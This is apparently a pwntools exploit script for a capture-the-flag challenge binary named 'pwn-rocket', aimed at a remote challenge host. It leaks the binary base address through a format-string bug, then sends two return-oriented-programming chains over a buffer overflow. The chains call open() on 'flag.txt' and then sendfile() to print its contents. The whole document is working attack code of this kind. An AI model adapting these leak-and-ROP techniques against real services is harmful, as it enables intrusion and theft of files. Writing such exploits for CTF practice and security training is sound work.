from pwn import *

context.arch = 'amd64'
context.terminal = ['konsole', '-e']

gdbscript = '''
    break vuln
'''

# offsets to gadgets from main binary
GDGT_POP_RAX = 0x0000000000001210
GDGT_POP_RDI = 0x000000000000168b
GDGT_POP_RSI_POP_R15 = 0x0000000000001689
GDGT_POP_RDX = 0x00000000000014be
GDGT_POP_R10 = 0x00000000000014c7
GDGT_POP_R8 = 0x00000000000014d1
GDGT_SYSCALL = 0x00000000000014db

STR_FLAGTXT = 0x2d70 + 'MMMMMMMMMMMMMMMMMMMKONMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMflag.txt'.index('f')
VULN_FUNC = 0x0001531

### First phase - leak binary base address
#BINARY_OFFSET = 0x55eda8b98606 - 0x55eda8b97000 ### First offset was found locally and does not work on remote
BINARY_OFFSET = 0x558299cca0e0 - 0x558299cc9000

#s = gdb.debug('./pwn-rocket', gdbscript=gdbscript)
s = remote('0.cloud.chals.io', 13163)
#s = process('./pwn-rocket')

print('PROG OUT:', s.readline())
#FMT_STR = b'%7$p' ### First fmt string was found locally and does not work on the remote
FMT_STR = b'%6$p'
s.writeline(FMT_STR)

print('PROG OUT:', s.readuntil(b':'))
addr_leak = s.readline().decode()
print('ADDR LEAK:', addr_leak)

BINARY_BASE = int(addr_leak.strip(), 16) - BINARY_OFFSET

print('BIN BASE LEAK:', hex(BINARY_BASE))
print('VULN:', hex(BINARY_BASE + VULN_FUNC))

print('PROG OUT:', s.readline())

### Second phase - rop chains rop chains
payload = b'A' * 72

# First we call open()
payload += p64(BINARY_BASE + GDGT_POP_RDI) # first arg -> filename
payload += p64(BINARY_BASE + STR_FLAGTXT) # set to "flag.txt"

payload += p64(BINARY_BASE + GDGT_POP_RSI_POP_R15) # second arg -> flags
payload += p64(0x0) # 0 -> O_RDONLY
payload += p64(0xdeadbeef) # trash for r15

payload += p64(BINARY_BASE + GDGT_POP_RDX) # third arg -> mode
payload += p64(0x0) # no mode

payload += p64(BINARY_BASE + GDGT_POP_RAX) # rax contains syscall number
payload += p64(2) # 2 is open()

payload += p64(BINARY_BASE + GDGT_SYSCALL) # perform syscall

payload += p64(BINARY_BASE + VULN_FUNC) # return to vuln()

print('SENDING PAYLOAD:', payload)
s.writeline(payload)

# afterwards call sendfile()
payload = b'A' * 72

payload += p64(BINARY_BASE + GDGT_POP_RDI) # first arg -> out_fd
payload += p64(1) # stdout

payload += p64(BINARY_BASE + GDGT_POP_RSI_POP_R15) # second arg -> in_fd
payload += p64(3) # will most likely be 3 after open()
payload += p64(0xdaedbeef)

payload += p64(BINARY_BASE + GDGT_POP_RDX) # third arg -> offset
payload += p64(0)

payload += p64(BINARY_BASE + GDGT_POP_R10) # third arg -> count
payload += p64(100)

payload += p64(BINARY_BASE + GDGT_POP_RAX) # rax contains syscall number
payload += p64(40) # 40 is sendfile

payload += p64(BINARY_BASE + GDGT_SYSCALL) # perform syscall

payload += p64(BINARY_BASE + VULN_FUNC) # return to vuln()

print('PROG OUT:', s.readuntil(b"Please authenticate >>>\n"))
s.writeline(b'test')

print('PROG OUT:', s.read())
print('SENDING PAYLOAD2:', payload)
s.writeline(payload)

s.interactive()
